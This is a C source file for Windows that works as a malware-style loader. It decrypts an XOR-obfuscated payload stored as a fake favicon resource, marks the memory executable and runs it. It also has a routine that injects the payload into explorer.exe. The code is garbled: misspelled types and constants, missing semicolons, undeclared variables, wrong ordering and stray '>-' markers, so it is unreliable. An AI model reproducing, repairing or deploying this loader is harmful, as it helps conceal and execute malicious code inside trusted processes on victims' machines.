#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

char key[] = "mysecretpassword";

void XOR(char* data, size_t data_len, char* key, size_t key_len)
{
    int j = 0;
    for(int i = 0; i < data_len; i++)
    {
        if(j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

void code_injection()
{
    pid = FIndTarget("explorer.exe");
    if (pid)
    {
        printf("PID FOUND AT ==> %d\n", pid);

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                PROCESS_V_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE< (DWORD) pid);
        if (hProc != NULL)
        {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }

}
int main(void)
{
  void* exec_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;
  HGLOBAL resHandle = NULL;

  unsinged char* payload
  unsinged int payload_len;

  XOR((char*) exec_mem, payload_len, key, sizeof(key))
  >-// Extract payload from resources section
>-res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
>-resHandle = LoadResource(NULL, res);
>-payload = (char *) LockResource(resHandle);
>-payload_len = SizeofResource(NULL, res);
>-
>-// Allocate some memory buffer for payload
>-exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
>-printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
>-printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

>-// Copy payload to new memory buffer
>-RtlMoveMemory(exec_mem, payload, payload_len);
>-
>-// Make the buffer executable
>-rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

>-printf("\nHit me!\n");
>-getchar();

>-// Launch the payload
>-if ( rv != 0 ) {
>->->-th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
>->->-WaitForSingleObject(th, -1);
>-}

return 0;

}
